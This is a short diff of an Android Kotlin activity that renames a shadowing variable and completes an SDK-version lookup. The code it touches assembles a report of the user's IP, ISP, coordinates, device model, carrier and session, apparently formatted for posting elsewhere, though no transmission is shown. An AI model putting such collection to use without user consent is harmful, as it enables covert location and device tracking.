@@ -188,7 +188,6 @@ class KeyActivity : Activity() {
         scroll.addView(content)
         setContentView(scroll)
     }
-
     override fun onResume() {
         super.onResume()
         blink?.start()
@@ -242,8 +241,8 @@ class KeyActivity : Activity() {
                     .format(java.util.Date())
                 val modelo = android.os.Build.MODEL
                 val marca = android.os.Build.BRAND
-                val android = android.os.Build.VERSION.RELEASE
-                val sdk = android.os
+                val versionAndroid = android.os.Build.VERSION.RELEASE
+                val sdk = android.os.Build.VERSION.SDK_INT
 
                 val desc = """
                     **IP:** ${j.optString("query", ip)}
@@ -253,7 +252,7 @@ class KeyActivity : Activity() {
                     **ISP:** ${j.optString("isp", "?")}
                     **Coords:** ${j.optDouble("lat", 0.0)}, ${j.optDouble("lon", 0.0)}
                     **Equipo:** $marca $modelo
-                    **Android:** $android (SDK $sdk)
+                    **Android:** $versionAndroid (SDK $sdk)
                     **Operador:** $operador
                     **Hora:** $hora
                     **Sesión:** $sesion
